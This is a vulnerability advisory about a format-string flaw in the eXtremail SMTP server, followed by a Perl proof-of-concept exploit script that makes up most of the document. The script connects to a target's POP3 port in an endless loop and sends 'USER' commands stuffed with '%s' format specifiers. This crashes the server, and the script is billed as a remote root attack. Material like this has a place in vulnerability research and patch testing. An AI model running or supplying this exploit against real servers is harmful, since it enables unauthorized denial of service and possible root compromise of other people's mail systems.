source: http://www.securityfocus.com/bid/2908/info
  
eXtremail is a freeware SMTP server available for Linux and AIX.
  
eXtremail contains a format-string vulnerability in its logging mechanism. Attackers can send SMTP commands argumented with maliciously constructed arguments that will exploit this vulnerability.
  
eXtremail runs with root privileges. By exploiting this vulnerability, remote attackers can gain superuser access on the underlying host and can crash eXtremail. If the system is not restarted automatically, a denial of SMTP service will result.
  
UPDATE (April 26, 2004): Reportedly, this vulnerability has been reintroduced into the new version (1.5.9) of eXtremail.
  
UPDATE (October 26, 2007): Reports indicate that the 'USER' command of eXtremail 2.1.1 and prior is still vulnerable. Symantec has not confirmed this. 

#!/usr/bin/perl
#
# extremail-v3.pl
#
# Copyright (c) 2006 by <mu-b@digit-labs.org>
#
# eXtremail <=2.1.1 remote root POC (x86-lnx)
# by mu-b - Fri Oct 06 2006
#
# Tested on: eXtremail 2.1.1 (lnx)
#            eXtremail 2.1.0 (lnx)
#
#    - Private Source Code -DO NOT DISTRIBUTE -
# http://www.digit-labs.org/ -- Digit-Labs 2006!@$!
########

use Getopt::Std; getopts('t:n:u:p:', \%arg);
use Socket;

&print_header;

my $target;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (!(defined($target))) { &usage; }

my $pop3_port = 110;
my $send_delay = 1;

my $NOP = 'A';

srand(time());
while (1) {
    if (connect_host($target, $pop3_port)) {
        # [0,50) -> [1,50]
        $max_len  = int(rand(50) + 1);

        # [0, $max_len * 0.75) -> [0, ($max_len * 0x75) - 1]
        $pad1_len = int(rand($max_len * 0.75));

        # [0, ($max_len - $pad1_len)/2) -> [1, ($max_len - $pad1_len)/2]
        $pad2_len = int(rand(($max_len - $pad1_len)/length("%s")) + 1);

        $pad3_len = $max_len - $pad1_len - ($pad2_len * length("%s"));

        $buf = "USER ".
               ($NOP x $pad1_len).
               ("%s" x $pad2_len).
               ($NOP x $pad3_len).
               "\n";
        print("-> * Sending: $max_len $pad1_len $pad2_len $pad3_len 
".$buf);
        send(SOCKET, $buf, 0);
        sleep($send_delay);

        close(SOCKET);
    }
}

sub print_header {
    print("eXtremail <=2.1.1 remote root POC (x86-lnx)\n");
    print("by: <mu-b\@digit-labs.org>\n");
    print("http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
}

sub usage {
  print(qq(Usage: $0 -t <hostname>

     -t <hostname>    : hostname to test
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
    $proto  = getprotobyname('tcp')              || die("Error: $!\n");

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr)                      || die("Error: $!\n");
    return(1338);
}